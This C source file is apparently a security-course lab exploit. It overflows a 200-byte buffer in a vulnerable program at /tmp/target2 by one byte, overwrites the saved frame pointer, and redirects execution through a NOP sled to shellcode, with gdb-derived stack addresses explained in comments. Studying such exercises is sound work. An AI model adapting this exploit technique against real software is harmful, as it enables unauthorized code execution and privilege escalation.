#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
	// The exploit is due to the fact that we can overwrite a single byte past
	// the buffer[200]. This let's us overwrite $ebp, which is copied to $esp
	// (the stack pointer) once the function returns. The general idea is that
	// we can therefore manipulate $esp (the stack pointer) so it points to an
	// arbitrary address. It then pops ($ebp) from the stack, and reads ($eip)
	// from the stack, which gives us full control.

	// We make the explot one byte (+ null char) too large.
	char sploitstring[202 * sizeof(char)];

	// Fill with NOOPs and null terminate.
	memset(sploitstring, '\x90', sizeof(sploitstring));
	sploitstring[sizeof(sploitstring) - 1] = 0;

	// The final byte overwrites part of $ebp stored in the stack frame of bar().
	// By inspecting gdb, we modify this so it points into our buffer, since the
	// processor will then copy this value to $esp (the stack pointer) and then
	// pop the value this points to (popping what it thinks is $ebp) and then read
	// the next value into $eip.
	// The $ebp value of bar() is 0xbffffd9c, and we want it to be
	// 0xbffffd8c (buffer[196], storing the address to the shell code) - 0x4 (
	// since we will pop $ebp before reading). Note all this requires is changing
	// the last byte.
	sploitstring[sizeof(sploitstring) - 2] = 0x8c - 0x4;

	// With the manipulated stack, this value now occopies the space of $eip.
	// We can set it to point directly to the buffer since the buffer will be full
	//  of NOOP slides to our shellcode.
	*(void**)(&sploitstring[sizeof(sploitstring) - 6]) = (void*) 0xbffffcc8;

	// We copy the shellcode into the buffer, minus the null-terminal.
	memcpy(&sploitstring[sizeof(sploitstring) - (sizeof(shellcode) - 1) - 6],
	       shellcode, sizeof(shellcode) - 1);


	char *args[] = { TARGET, sploitstring, NULL };
	char *env[] = { NULL };

	execve(TARGET, args, env);
	fprintf(stderr, "execve failed.\n");

	return 0;
}
